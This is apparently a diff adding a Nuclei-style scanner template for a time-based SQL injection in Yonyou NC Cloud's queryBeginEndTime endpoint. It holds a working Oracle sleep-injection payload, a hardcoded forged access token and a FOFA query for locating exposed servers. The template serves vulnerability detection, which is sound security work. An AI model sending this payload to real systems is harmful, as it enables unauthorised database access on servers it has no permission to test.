@@ -1,0 +1,27 @@
+id: yonyou-nc-cloud-queryBeginEndTime-sqli
+
+info:
+  name: 用友 NC Cloud queryBeginEndTime - sqli
+  author: leadlife
+  severity: high
+  description:
+  reference:
+    - todo
+  metadata:
+    verified: true
+    fofa-query: app="用友-NC-Cloud"
+  tags: sqli, yonyou,nccloud,oa,time
+
+http:
+  - raw:
+      - |
+        @timeout: 15s
+        GET /ncchr/period/queryBeginEndTime?staffid=1%3F'%20and%204431%3Ddbms_pipe.receive_message(chr(83)%7C%7Cchr(104)%7C%7Cchr(82)%7C%7Cchr(70)%2C6)-- HTTP/1.1
+        Host: {{Hostname}}
+        accessTokenNcc: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyaWQiOiIxIn0.F5qVK-ZZEgu3WjlzIANk2JXwF49K5cBruYMnIOxItOQ
+
+    matchers:
+      - type: dsl
+        dsl:
+          - duration >= 5 && duration < 9
+          
